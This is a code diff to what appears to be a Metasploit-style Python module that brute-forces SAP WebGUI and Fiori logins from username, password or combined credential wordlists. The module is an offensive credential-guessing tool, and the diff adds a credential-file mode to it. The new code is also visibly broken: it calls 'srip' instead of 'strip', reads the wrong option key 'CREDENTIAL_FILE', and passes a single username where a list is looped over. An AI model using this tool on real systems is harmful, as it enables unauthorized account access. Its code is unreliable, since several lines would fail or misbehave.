@@ -39,8 +39,9 @@ metadata = {
         'SAP_CLIENT': {'type': 'string', 'description': 'Target SAP client', 'required': False, 'default': '001'},
         'BRUTE_MODE': {'type': 'string', 'description': 'Which endpoint you want to attack (webgui/fiori)', 'required': False, 'default': 'webgui'},
         'SSL': {'type': 'bool', 'description': 'use SSL (true/false)', 'required': True, 'default': False},
-        'USER_FILE': {'type': 'string', 'description': 'Wordlist with usernames', 'required': True},
-        'PASS_FILE': {'type': 'string', 'description': 'Wordlist with passwords', 'required': True}
+        'CRED_FILE': {'type': 'string', 'description': 'Wordlist with usernames and passwords separated by : (Example: user:password)', 'required': False},
+        'USER_FILE': {'type': 'string', 'description': 'Wordlist with usernames', 'required': False},
+        'PASS_FILE': {'type': 'string', 'description': 'Wordlist with passwords', 'required': False}
     }
 }
 
@@ -118,7 +119,6 @@ def webgui_login(url, username, password, client, sid):
 
 def bruteforce(usernames, password, url, client, sid, mode):
     for user in usernames:
-        user = user.strip("\n")
         module.log("trying: {}:{}".format(user, password), "debug")
         if mode == "webgui":
             login_success = webgui_login(url = url, username = user, password = password, client = client, sid = sid)
@@ -134,36 +134,52 @@ def bruteforce(usernames, password, url, client, sid, mode):
         else:
             pass
 
-def load_wordlist(userfile, passfile):
+def load_wordlist(userfile="", passfile=""):
         user_list = []
         pw_list = []
         with open(userfile, "r") as user_file:
                 for user in user_file:
-                        user_list.append(user)
+                    user = user.strip("\n")
+                    user_list.append(user)
         module.log("usernames loaded", "debug")
-        
+            
         with open(passfile) as pwfile:
                 for password in pwfile:
-                        pw_list.append(password)
-        
+                    password = password.srip("\n")
+                    pw_list.append(password)
+
         module.log("passwords loaded", "debug")
+
         return user_list, pw_list
 
 def run(args):
     module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
     if dependencies_missing:
-        logging.error('Module dependency (requests, bs4 or lxml) is missing, cannot continue \n To install, execute python3 -m pip install requests bs4 lxml')
+        logging.error('Module dependency is missing, cannot continue!')
         return
 
-    usernames, passwords = load_wordlist(userfile = args['USER_FILE'], passfile = args['PASS_FILE'])
     url = build_url(server = args['RHOSTS'], port = args['RPORT'], targeturi = args['TARGETURI'], https_check = args['SSL'])
-    try:
-        for password in passwords:
-            password = password.strip("\n")
-            bruteforce(url = url, usernames = usernames, password = password, client = args['SAP_CLIENT'], sid = args['SAP_SID'], mode = args['BRUTE_MODE'])
-    except Exception as e:
-        logging.error('{}'.format(e))
-        pass
+
+    if (len(args['CRED_FILE'])>0):
+        with open(args['CREDENTIAL_FILE'], "r") as credfile:
+            for line in credfile:
+                line = line.strip()
+                username,password = line.split(":", 1)
+                try:
+                    bruteforce(url = url, usernames = username, password = password, client = args['SAP_CLIENT'], sid = args['SAP_SID'], mode = args['BRUTE_MODE'])
+                except Exception as e:
+                    logging.error('{}'.format(e))
+                    pass
+    elif (len(args['USER_FILE'])>0) and (len(args['PASS_FILE'])>0):
+        usernames, passwords = load_wordlist(userfile = args['USER_FILE'], passfile = args['PASS_FILE'])
+        try:
+            for password in passwords:
+                bruteforce(url = url, usernames = usernames, password = password, client = args['SAP_CLIENT'], sid = args['SAP_SID'], mode = args['BRUTE_MODE'])
+        except Exception as e:
+            logging.error('{}'.format(e))
+            pass
+    else:
+        logging.error("please check username/password or credential file for existence or format issues")
 
 if __name__ == '__main__':
     module.run(metadata, run)
